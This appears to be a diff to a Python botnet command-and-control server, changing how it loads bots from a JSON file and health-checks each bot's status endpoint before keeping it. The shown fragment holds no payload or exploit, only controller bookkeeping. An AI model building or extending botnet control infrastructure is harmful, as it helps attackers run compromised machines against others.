@@ -7,6 +7,8 @@ import threading
 from termcolor import colored, cprint
 
 
+# TODO function to handle request and remove disconnected bots
+
 class CnC:
     """
     Command & Control center of the botnet.
@@ -14,9 +16,8 @@ class CnC:
 
     def __init__(self, host: str, port: int):
         self.__address = (host, port)
-
-        with open("bots.json", "r") as f:
-            self.__bots = json.load(f)
+        self.__bots = {}
+        self.__load_bots()
 
         self.__cmds = {
             'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': False},
@@ -33,6 +34,17 @@ class CnC:
         self.__socket.bind(self.__address)
         self.__socket.listen(10)
         self.__socket.settimeout(3)
+
+    def __load_bots(self):
+        with open("bots.json", "r") as f:
+            bots = json.load(f)
+
+        for addr, port in bots.items():
+            try:
+                requests.get(f"http://{addr}:{port}/status")
+            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
+                continue
+            self.__bots[addr] = port
 
     def __bot_connection(self, stop: threading.Event):
 
